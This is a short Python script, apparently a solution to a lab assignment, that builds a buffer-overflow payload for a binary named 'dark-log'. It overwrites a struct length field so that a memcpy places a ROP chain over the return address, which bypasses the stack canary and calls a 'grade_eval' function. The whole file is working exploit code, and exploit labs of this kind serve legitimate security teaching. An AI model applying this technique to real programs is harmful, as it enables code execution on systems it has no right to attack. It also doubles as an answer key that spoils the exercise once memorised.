#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log (canary bypass).

The struct keeps expression/logMsg/len in a fixed order. We overflow
expression to overwrite len=168, so that `memcpy(logMsg+len, expression, 128)`
copies our ROP chain onto the return address without touching the canary.
"""
import sys

# ROP 链（放 expression[0..127]，之后被 memcpy 复制到返回地址处）
rop = b""
rop += (0x4018a4).to_bytes(8, "little")  # ret（栈对齐）
rop += (0x4018a3).to_bytes(8, "little")  # pop rdi; ret
rop += (4).to_bytes(8, "little")         # rdi = 4
rop += (0x401677).to_bytes(8, "little")  # grade_eval
rop += b"P" * (128 - len(rop))           # 补齐到 128 字节

# gets 第一阶段：写满 expression/logMsg，改 len=168，停在 canary 之前
payload = rop                          # 0..127   expression
payload += b"F" * 128                  # 128..255 logMsg（填充）
payload += (168).to_bytes(4, "little") # 256..259 len = 168 -> memcpy 目标 = rbp+8
payload += b"G" * 8                    # 260..267 pad（填充）

sys.stdout.buffer.write(payload)
